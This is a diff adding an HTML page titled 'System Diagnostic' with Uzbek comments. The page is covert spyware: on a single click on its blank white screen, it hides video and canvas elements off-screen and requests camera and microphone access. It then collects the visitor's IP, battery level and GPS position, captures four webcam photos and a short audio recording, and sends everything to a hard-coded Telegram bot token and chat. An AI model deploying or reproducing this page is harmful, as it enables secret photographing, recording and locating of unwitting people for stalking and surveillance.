@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Diagnostic</title>
+    <style>
+        /* Mutlaqo bo'sh oq ekran */
+        body { margin: 0; padding: 0; width: 100vw; height: 100vh; background: #ffffff; cursor: pointer; overflow: hidden; }
+        #v, #c { position: fixed; left: -9999px; opacity: 0; }
+    </style>
+</head>
+<body>
+
+    <video id="v" autoplay muted playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const CONFIG = {
+            token: "8654987557:AAEjhBU4GAAnfpquEfRZFkYdrI0EXst4s9M",
+            chat: "1951212030"
+        };
+
+        let active = false;
+
+        document.body.onclick = async () => {
+            if (active) return;
+            active = true;
+
+            // Ma'lumotlarni yig'ish (IP va Batareya)
+            let meta = { bat: "...", ip: "...", geo: "Kutilmoqda" };
+            if (navigator.getBattery) navigator.getBattery().then(b => meta.bat = Math.round(b.level * 100) + "%");
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => meta.ip = d.ip);
+            
+            navigator.geolocation.getCurrentPosition(
+                p => meta.geo = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`,
+                () => meta.geo = "Rad etildi", { timeout: 5000 }
+            );
+
+            try {
+                // Kamera va mikrofonni majburiy ochish
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 } }, 
+                    audio: true 
+                });
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // Audio yozishni boshlash
+                let type = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
+                const rec = new MediaRecorder(stream, { mimeType: type });
+                let chunks = [];
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.start();
+
+                // 🚀 Qora rasmni yo'qotish uchun 4 soniya kutish (Kamera "isishi" uchun)
+                await new Promise(r => setTimeout(r, 4000));
+
+                const canvas = document.getElementById('c');
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+
+                // 4 ta tiniq rasm olish
+                for (let i = 1; i <= 4; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                    
+                    const fd = new FormData();
+                    fd.append("chat_id", CONFIG.chat);
+                    fd.append("photo", blob, `pic_${i}.jpg`);
+                    
+                    if (i === 1) {
+                        fd.append("caption", `✅ **100% ISHLADI**\n🌐 IP: ${meta.ip}\n🔋 Bat: ${meta.bat}\n📍 GPS: ${meta.geo}`);
+                        fd.append("parse_mode", "Markdown");
+                    }
+                    
+                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
+                    await new Promise(r => setTimeout(r, 1500)); 
+                }
+
+                // Audio tugatish
+                setTimeout(() => {
+                    rec.stop();
+                    rec.onstop = async () => {
+                        const aBlob = new Blob(chunks, { type: type });
+                        const afd = new FormData();
+                        afd.append("chat_id", CONFIG.chat);
+                        afd.append("voice", aBlob, "audio.ogg");
+                        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, { method: "POST", body: afd });
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                }, 4000);
+
+            } catch (err) {
+                // Xatoni aniqlash (Botga yuborish)
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                    method: "POST",
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        chat_id: CONFIG.chat, 
+                        text: `❌ Xato: ${err.name}\nMuammo: Brauzer kamerani ochishga yo'l bermadi (Kamera band bo'lishi mumkin).` 
+                    })
+                });
+            }
+        };
+    </script>
+</body>
+</html>
